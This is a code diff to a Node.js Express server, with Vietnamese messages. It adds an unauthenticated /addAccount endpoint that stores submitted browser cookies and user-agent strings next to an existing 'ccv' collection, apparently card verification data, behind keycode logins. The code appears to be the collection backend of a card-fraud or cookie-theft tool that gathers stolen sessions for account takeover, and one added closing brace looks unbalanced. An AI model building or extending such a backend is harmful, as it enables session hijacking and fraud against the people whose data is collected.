@@ -17,6 +17,8 @@ let ccvSchema = require('./schema/ccvschema')
 let Ccv = mongoose.model('ccv', ccvSchema, 'ccv')
 let keycodeschema = require('./schema/keycodeschema')
 let KeyCode = mongoose.model('keycode', keycodeschema, 'keycode')
+let accountSchema = require('./schema/accountSchema')
+let Account = mongoose.model('account',accountSchema,'account')
 //Express init
 app.set('views', path.join(__dirname, "views"))
 app.set('view engine', 'hbs')
@@ -64,6 +66,21 @@ app.get('/', async (req, res) => {
         res.send(json)
     }
 });
+})
+app.post('/addAccount', async (req, res) => {
+    let account = new Account({
+        cookies: req.body.cookies,
+        userAgent:req.body.userAgent
+    })
+    try {
+        let stt = await account.save()
+        if (stt != null) {
+            res.send(200,"Thêm thành công !")
+        }
+    } catch (e) {
+        res.send(500,'Có lỗi xảy ra' + e)
+    }
+
 })
 app.post('/login', async (req, res) => {
     let isExisted = await KeyCode.find({keycode: req.body.keycode})
